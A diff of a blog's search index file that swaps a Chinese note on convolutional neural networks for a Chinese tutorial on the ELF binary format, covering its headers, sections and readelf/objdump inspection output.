@@ -1,498 +1,307 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>CNN原理与实践</title>
-    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
-    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
-<h3 id="卷积">卷积</h3>
-<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
-<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
-<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
-<meta name="referrer" content="no-referrer"/>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
-<h3 id="padding填白">Padding填白</h3>
-<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
-<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
-<p>valid 就是不经过任何填白。</p>
-<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="步长stride">步长stride</h3>
-<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
-<h3 id="pooling池化">pooling池化</h3>
-<p>有的地方也成为<strong>采样sampling</strong></p>
-<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
-<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="多通道卷积">多通道卷积</h3>
-<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
-<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
-<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
-<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="cnn网络结构">CNN网络结构</h3>
-<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
-<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
-<ul>
-<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
-<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" alt="image-20211010095224357" /><figcaption aria-hidden="true">image-20211010095224357</figcaption>
-</figure>
-<h2 id="cnn代码实践">CNN代码实践</h2>
-<h2 id="参考">参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>ELF文件解析</title>
+      <link href="/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html"/>
+      <url>/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html</url>
+      
+        <content type="html"><![CDATA[<p>ELF可执行可链接格式，最初由UNIX系统实验室作为应用程序二进制接口的一部分制定，是COFF(common file format)的变种，相关定义在/usr/include/elf.h文件中。</p><span id="more"></span><h2 id="elf-文件类型">ELF 文件类型</h2><p>说明：linux和windows识别文件格式不同，linux是根据文件头的字段，windows直接根据文件名后缀。</p><p>主要分为三类：</p><ul><li>可执行文件executable file：经过链接、可执行的目标文件，也被称为程序。</li><li>可重定位文（relocatable file）：由源文件编译但是没有链接的目标文件，通常以.o作为拓展名。用于与其他文件链接构成可执行文件或动态链接库，通常是一段位置独立的代码(Position Independent code, PIC)</li><li>共享目标文件（shared object file）：动态链接库文件，用于在链接的过程中与其他动态链接库或可重定位文件一起构建可执行文件。</li></ul><p>除此之外，还存在 <strong>核心转储文件(core dump file)</strong>作为进程以外终止时地址空间的转储，也是ELF文件的一种。可以使用gdb工具读取辅助调试和查找程序崩溃的原因。</p><p>在内核中的定义（/include/uapi/linux/elf.h）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_REL     1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_EXEC   2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_DYN    3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_CORE  4</span></span><br></pre></td></tr></table></figure><h2 id="elf文件格式">ELF文件格式</h2><h3 id="总体布局">总体布局</h3><p>ELF文件格式提供了两种视图，分别是链接视图和执行视图。<strong>链接视图是以节（section）为单位</strong>，<strong>执行视图是以段（segment）为单位</strong>。接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。</p><figure><img src="../images/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/2348945-20211111190022555-192049174.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以使用<code>readelf -l hello</code>查看一个链接后的elf可执行文件，Section to Segment 的映射关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Elf 文件类型为 EXEC (可执行文件)</span><br><span class="line">Entry point 0x401cc0</span><br><span class="line">There are 8 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">程序头：</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x0000000000000488 0x0000000000000488  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000</span><br><span class="line">                 0x000000000007fab1 0x000000000007fab1  R E    0x1000</span><br><span class="line">  LOAD           0x0000000000081000 0x0000000000481000 0x0000000000481000</span><br><span class="line">                 0x0000000000026e0b 0x0000000000026e0b  R      0x1000</span><br><span class="line">  LOAD           0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x00000000000052f0 0x0000000000006b20  RW     0x1000</span><br><span class="line">  NOTE           0x0000000000000200 0x0000000000400200 0x0000000000400200</span><br><span class="line">                 0x0000000000000044 0x0000000000000044  R      0x4</span><br><span class="line">  TLS            0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x0000000000000020 0x0000000000000060  R      0x8</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x0000000000003000 0x0000000000003000  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  段节...</span><br><span class="line">   00     .note.gnu.build-id .note.ABI-tag .rela.plt </span><br><span class="line">   01     .init .plt .text __libc_freeres_fn .fini </span><br><span class="line">   02     .rodata .eh_frame .gcc_except_table </span><br><span class="line">   03     .tdata .init_array .fini_array .data.rel.ro .got .got.plt .data __libc_subfreeres __libc_IO_vtables __libc_atexit .bss __libc_freeres_ptrs </span><br><span class="line">   04     .note.gnu.build-id .note.ABI-tag </span><br><span class="line">   05     .tdata .tbss </span><br><span class="line">   06     </span><br><span class="line">   07     .tdata .init_array .fini_array .data.rel.ro .got </span><br></pre></td></tr></table></figure><p>下面的段序号和上面程序头里的段一一对应。</p><h3 id="文件结构">文件结构</h3><p>主要从链接的角度看elf文件。</p><h4 id="elf头">elf头</h4><p>描述文件的一些基本信息，文件头部存在魔术字符7f 45 4c 46即字符串"\177ELF"，当文件被映射到内存时可以通过该字符串查找位置，dump内存。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -h relocfile //查看文件头信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ELF 头：</span><br><span class="line">  Magic：  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF64</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              REL (可重定位文件)</span><br><span class="line">  系统架构:                          Advanced Micro Devices X86-64</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：              0x0</span><br><span class="line">  程序头起点：              0 (bytes into file)</span><br><span class="line">  Start of section headers:          816 (bytes into file)</span><br><span class="line">  标志：             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 12</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>e_ident[EI_NIDENT];<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Halfe_type;    <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Halfe_machine;    <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Worde_version;    <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addre_entry;    <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Offe_phoff;        <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Offe_shoff;        <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Worde_flags;    <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Halfe_ehsize;    <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Halfe_phnum;    <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Halfe_shnum;    <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Halfe_shstrndx;    <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="程序头表program-header-table">程序头表（program header table）</h4><p>列举了所有有效的段(segments)和他们的属性（执行视图）,链接视图是可选的，一般没有。</p><p>程序头是一个结构的数组，每一个结构都表示一个段(segments)。在可执行文件或者共享链接库中所有的节(sections)都被分为不同的几个段(segments)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span>&#123;</span></span><br><span class="line">  Elf32_Wordp_type;    <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Offp_offset;</span><br><span class="line">  Elf32_Addrp_vaddr;</span><br><span class="line">  Elf32_Addrp_paddr;</span><br><span class="line">  Elf32_Wordp_filesz;</span><br><span class="line">  Elf32_Wordp_memsz;</span><br><span class="line">  Elf32_Wordp_flags;</span><br><span class="line">  Elf32_Wordp_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>程序头的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize)都是通过 ELF头部信息获取的。</p><p>可通过<code>readelf -l</code>读取ELF程序头信息：</p><h4 id="节头表section-header-table">节头表（section header table）</h4><p>一个ELF文件中到底有哪些具体的 sections，由包含在这个ELF文件中的 section head table(SHT)决定。每个section描述了这个段的信息，比如每个段的段名、段的长度、在文件中的偏移、读写权限及段的其它属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span>&#123;</span></span><br><span class="line">    Elf32_Word sh_name;   <span class="comment">//节区名，名字是一个 NULL 结尾的字符串。</span></span><br><span class="line">    Elf32_Word sh_type;    <span class="comment">//为节区类型</span></span><br><span class="line">    Elf32_Word sh_flags;    <span class="comment">//节区标志</span></span><br><span class="line">    Elf32_Addr sh_addr;    <span class="comment">//节区的第一个字节应处的位置。否则，此字段为 0。</span></span><br><span class="line">    Elf32_Off sh_offset;    <span class="comment">//此成员的取值给出节区的第一个字节与文件头之间的偏移。</span></span><br><span class="line">    Elf32_Word sh_size;   <span class="comment">//此 成 员 给 出 节 区 的 长 度 （ 字 节 数 ）。</span></span><br><span class="line">    Elf32_Word sh_link;   <span class="comment">//此成员给出节区头部表索引链接。其具体的解释依赖于节区类型。</span></span><br><span class="line">    Elf32_Word sh_info;       <span class="comment">//此成员给出附加信息，其解释依赖于节区类型。</span></span><br><span class="line">    Elf32_Word sh_addralign;    <span class="comment">//某些节区带有地址对齐约束.</span></span><br><span class="line">    Elf32_Word sh_entsize;    <span class="comment">//给出每个表项的长度字节数。</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>节区名存储在.<a href="onenote:#elf加载过程&amp;section-id=%7B503CCFB6-C32E-4B72-8C67-CB9E878870BE%7D&amp;page-id=%7B934E7334-CB4A-4A41-814C-8742312D7636%7D&amp;object-id=%7BC81FF8EC-AF62-0DAD-105B-29D5DD1E0EA2%7D&amp;7D&amp;base-path=https://d.docs.live.net/aba64c6627629f31/文档/我的笔记本/源码整理/Linux内核学习/进程管理.one">shstrtab</a>字符串表中，sh_name是表中偏移。</p><p>可通过<strong>readelf -S</strong> 读取sections' header：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">There are 29 section headers, starting at offset 0xbf0f8:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [号] 名称              类型             地址              偏移量</span><br><span class="line">       大小              全体大小          旗标   链接   信息   对齐</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.bu[...] NOTE             0000000000400200  00000200</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             0000000000400224  00000224</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .rela.plt         RELA             0000000000400248  00000248</span><br><span class="line">       0000000000000240  0000000000000018  AI       0    18     8</span><br><span class="line">  [ 4] .init             PROGBITS         0000000000401000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [ 5] .plt              PROGBITS         0000000000401018  00001018</span><br><span class="line">       00000000000000c0  0000000000000000  AX       0     0     8</span><br><span class="line">  [ 6] .text             PROGBITS         00000000004010e0  000010e0</span><br><span class="line">       000000000007ef60  0000000000000000  AX       0     0     16</span><br><span class="line">  [ 7] __libc_freeres_fn PROGBITS         0000000000480040  00080040</span><br><span class="line">       0000000000000a66  0000000000000000  AX       0     0     16</span><br><span class="line">  [ 8] .fini             PROGBITS         0000000000480aa8  00080aa8</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [ 9] .rodata           PROGBITS         0000000000481000  00081000</span><br><span class="line">       000000000001c61c  0000000000000000   A       0     0     32</span><br><span class="line">  [10] .eh_frame         PROGBITS         000000000049d620  0009d620</span><br><span class="line">       000000000000a71c  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .gcc_except_table PROGBITS         00000000004a7d3c  000a7d3c</span><br><span class="line">       00000000000000cf  0000000000000000   A       0     0     1</span><br><span class="line">  [12] .tdata            PROGBITS         00000000004a9000  000a8000</span><br><span class="line">       0000000000000020  0000000000000000 WAT       0     0     8</span><br><span class="line">  [13] .tbss             NOBITS           00000000004a9020  000a8020</span><br><span class="line">       0000000000000040  0000000000000000 WAT       0     0     8</span><br><span class="line">  [14] .init_array       INIT_ARRAY       00000000004a9020  000a8020</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [15] .fini_array       FINI_ARRAY       00000000004a9030  000a8030</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [16] .data.rel.ro      PROGBITS         00000000004a9040  000a8040</span><br><span class="line">       0000000000002ed4  0000000000000000  WA       0     0     32</span><br><span class="line">  [17] .got              PROGBITS         00000000004abf18  000aaf18</span><br><span class="line">       00000000000000e0  0000000000000000  WA       0     0     8</span><br><span class="line">  [18] .got.plt          PROGBITS         00000000004ac000  000ab000</span><br><span class="line">       00000000000000d8  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .data             PROGBITS         00000000004ac0e0  000ab0e0</span><br><span class="line">       0000000000001a50  0000000000000000  WA       0     0     32</span><br><span class="line">  [20] __libc_subfreeres PROGBITS         00000000004adb30  000acb30</span><br><span class="line">       0000000000000048  0000000000000000  WA       0     0     8</span><br><span class="line">  [21] __libc_IO_vtables PROGBITS         00000000004adb80  000acb80</span><br><span class="line">       0000000000000768  0000000000000000  WA       0     0     32</span><br><span class="line">  [22] __libc_atexit     PROGBITS         00000000004ae2e8  000ad2e8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           00000000004ae300  000ad2f0</span><br><span class="line">       0000000000001800  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] __libc_freer[...] NOBITS           00000000004afb00  000ad2f0</span><br><span class="line">       0000000000000020  0000000000000000  WA       0     0     8</span><br><span class="line">  [25] .comment          PROGBITS         0000000000000000  000ad2f0</span><br><span class="line">       0000000000000027  0000000000000001  MS       0     0     1</span><br><span class="line">  [26] .symtab           SYMTAB           0000000000000000  000ad318</span><br><span class="line">       000000000000b3e8  0000000000000018          27   765     8</span><br><span class="line">  [27] .strtab           STRTAB           0000000000000000  000b8700</span><br><span class="line">       00000000000068cf  0000000000000000           0     0     1</span><br><span class="line">  [28] .shstrtab         STRTAB           0000000000000000  000befcf</span><br><span class="line">       0000000000000128  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>sh_name</th><th>sh_type</th><th>description</th></tr></thead><tbody><tr class="odd"><td>.text</td><td>SHT_PROGBITS</td><td>代码段，包含程序的可执行指令</td></tr><tr class="even"><td>.data</td><td>SHT_PROGBITS</td><td>包含初始化了的数据，将出现在程序的内存映像中</td></tr><tr class="odd"><td>.bss</td><td>SHT_NOBITS</td><td>未初始化数据，因为只有符号所以</td></tr><tr class="even"><td>.rodata</td><td>SHT_PROGBITS</td><td>包含只读数据</td></tr><tr class="odd"><td>.comment</td><td>SHT_PROGBITS</td><td>包含版本控制信息</td></tr><tr class="even"><td>.eh_frame</td><td>SHT_PROGBITS</td><td>它生成描述如何unwind 堆栈的表</td></tr><tr class="odd"><td>.debug</td><td>SHT_PROGBITS</td><td>此节区包含用于符号调试的信息</td></tr><tr class="even"><td>.dynsym</td><td>SHT_DYNSYM</td><td>此节区包含了动态链接符号表</td></tr><tr class="odd"><td>.shstrtab</td><td>SHT_STRTAB</td><td>存放section名，字符串表。Section Header String Table</td></tr><tr class="even"><td>.strtab</td><td>SHT_STRTAB</td><td>字符串表</td></tr><tr class="odd"><td>.symtab</td><td>SHT_SYMTAB</td><td>符号表</td></tr><tr class="even"><td>.got</td><td>SHT_PROGBITS</td><td>全局偏移表</td></tr><tr class="odd"><td>.plt</td><td>SHT_PROGBITS</td><td>过程链接表</td></tr><tr class="even"><td>.relname</td><td>SHT_REL</td><td>包含了重定位信息，例如 .text 节区的重定位节区名字将是：.rel.text</td></tr></tbody></table><p><em>1）.text 代码段</em></p><p>可以通过objdump -d 反汇编，查看ELF文件代码段内容。</p><p><em>2）.strtab / .shstrtab 字符串表</em></p><p>在ELF文件中，会用到很多字符串，比如节名，变量名等。所以ELF将所有的字符串集中放到一个表里，每一个字符串以’\0’分隔，然后使用字符串在表中的偏移来引用字符串。这样在ELF中引用字符串只需要给出一个数组下标即可。字符串表在ELF也以段的形式保存， .shstrtab是专供section name的字符串表。</p><p>可以用一下命令查看：readelf -S xxx.o</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Section Headers:  [Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align  [ 0]                   NULL             0000000000000000  00000000       0000000000000000  0000000000000000           0     0     0  [ 1] .text             PROGBITS         0000000000000000  00000040       0000000000000045  0000000000000000  AX       0     0     1  [ 2] .rela.text        RELA             0000000000000000  00000658       0000000000000048  0000000000000018          12     1     8  [ 3] .data             PROGBITS         0000000000000000  00000085       0000000000000000  0000000000000000  WA       0     0     1                         … …  [11] .shstrtab         STRTAB           0000000000000000  00000108       0000000000000074  0000000000000000           0     0     1  [12] .symtab           SYMTAB           0000000000000000  00000500       0000000000000138  0000000000000018          13    10     8  [13] .strtab           STRTAB           0000000000000000  00000638       000000000000001e  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure><p><em>3）.symtab 符号表</em></p><p>在链接的过程中需要把多个不同的目标文件合并在一起，不同的目标文件相互之间会引用变量和函数。在链接过程中，我们将函数和变量统称为符号，函数名和变量名就是符号名。</p><p>每个定义的符号都有一个相应的值，叫做符号值(Symbol Value)，对于变量和函数，符号值就是它们的地址。</p><p>可以使用下面命令查看：readelf -s xxx.o</p><figure><img src="../images/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/v2-c9e476401c19307c82b3fe89e3555224_720w.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><em>4）.eh_frame / .eh_frame_hdr</em></p><p>在调试程序的时候经常需要进行堆<strong>栈回溯</strong>，早期使用通用寄存器(ebp)来保存每层函数调用的栈帧地址，但局限性很大。后来现代Linux操作系统在LSB(Linux Standard Base)标准中定义了一个.eh_frame section，用来描述如何去unwind the stack。gcc编译器默认打开，如果不想把.eh_frame section编入elf文件，可以通过gcc选项 -fno-asynchronous-unwind-tables 去除。</p><p>GAS(GCC Assembler)汇编编译器定义了一组伪指令来协助eh_frame生成调用栈信息CFI(Call Frame Information)。具体原理在后续《栈回溯》章节分析，这里不再阐述。</p><p><em>5）重定位表（.relname）</em></p><p>链接器在处理目标文件时，需要对目标文件中的某些部位进行重定位，即代码段和数据中中那些绝对地址引用的位置。对于每个需要重定位的代码段或数据段，都会有一个相应的重定位表。比如”.rel.text”就是针对”.text”的重定位表，”.rel.data”就是针对”.data”的重定位表。</p><p>GOT是全局偏移表（ Global Offset Table），用于存储外部符号地址；PLT是程序链接表（Procedure Link Table），用于存储记录定位信息的额外代码。关于linux动态链接重定位原理，可以参考<a href="https://link.zhihu.com/?target=https%3A//linyt.blog.csdn.net/">海枫</a>写的《<a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/linyt/article/details/51635768">Linux动态链接中的PLT和GOT</a>》。</p><h2 id="相关命令">相关命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S relocfile //查看节头表objdump -x -s -d relocfile //查看.text汇编readelf -x .strtab relocfile //查看字符串表readelf -r file //查看重定位表</span><br></pre></td></tr></table></figure><h2 